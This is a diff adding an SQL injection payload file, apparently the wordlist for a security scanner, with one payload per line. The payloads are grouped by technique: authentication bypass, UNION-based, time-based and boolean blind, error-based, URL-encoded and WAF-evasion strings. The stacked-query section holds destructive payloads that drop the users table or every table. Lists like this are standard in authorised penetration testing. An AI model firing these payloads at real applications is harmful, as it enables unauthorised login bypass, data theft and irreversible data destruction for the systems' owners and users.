@@ -1,0 +1,67 @@
+# SQL Injection Payloads
+# One payload per line
+# Lines starting with # are comments and will be ignored
+# Add your own payloads by simply adding new lines!
+
+# Basic SQL injection tests
+' OR '1'='1
+' OR 1=1--
+admin'--
+' OR 'a'='a
+") OR ("a"="a
+
+# UNION-based injections
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+
+# Time-based blind SQL injection
+'; WAITFOR DELAY '00:00:05'--
+' OR SLEEP(5)--
+'; SELECT SLEEP(5)--
+
+# Error-based injections
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+
+# Stacked queries
+'; DROP TABLE users--
+1; DROP TABLE users--
+'; EXEC sp_MSForEachTable 'DROP TABLE ?'--
+
+# Authentication bypass
+admin' OR '1'='1'--
+' or 1=1 limit 1;--
+') or ('1'='1--
+
+# Boolean-based blind
+' AND '1'='1
+' AND '1'='2
+
+# Tautology-based
+1' OR '1'='1
+' OR 'x'='x
+' OR username IS NOT NULL OR username = '
+
+# Numeric injections
+1 OR 1=1
+999 OR 1=1
+-1 UNION SELECT 1,2,3--
+
+# String concatenation
+' || 'a'='a
+' + 'a'='a
+
+# URL encoded
+%27%20OR%20%271%27%3D%271
+%27%20UNION%20SELECT%20NULL--
+
+# Double URL encoded
+%2527%2520OR%25201%253D1--
+
+# WAF evasion attempts
+' /*!50000OR*/ '1'='1
+' UnIoN SeLeCt NULL--
+'/**/OR/**/1=1--
+' OR/**/1=1--
